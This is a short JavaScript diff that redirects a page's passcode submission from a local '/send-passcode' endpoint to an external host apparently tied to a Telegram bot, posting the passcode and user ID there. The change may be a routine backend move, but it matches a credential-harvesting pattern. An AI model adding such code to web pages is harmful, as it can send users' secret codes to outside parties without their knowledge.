@@ -11,7 +11,7 @@ document.addEventListener("DOMContentLoaded", () => {
             return;
         }
 
-        fetch("/send-passcode", {
+        fetch("https://tgbot-6lgc.onrender.com", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ passcode: passcode, user_id: user_id })
